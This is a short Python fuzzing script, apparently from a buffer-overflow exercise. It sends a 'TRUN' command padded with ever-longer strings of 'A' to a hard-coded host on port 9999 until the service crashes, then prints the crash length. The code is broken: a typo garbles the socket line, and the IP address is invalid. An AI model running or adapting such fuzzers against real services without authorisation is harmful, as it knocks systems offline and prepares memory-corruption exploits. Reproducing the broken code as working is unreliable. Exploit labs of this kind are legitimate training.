#!/usr/bin/python3

import sys, socket 
from time import sleep

buffer = "A" * 100

while True:
	try:
		s =s ocket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('111.222.333.444', 9999))
		
		payload = "TRUN /.:/" + buffer #The extra characters go in after the TRUN command in order for the program to undesrstand it
		
		s.send((payload.encode())) #we encode this to ensure it works with python3
		s.close()
		sleep(1)
		buffer = buffer + "A"*100 #The amount of buffer will increase by 100 for every iteration in the while loop until it breaks
		
	except:
		print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
		sys.exit()
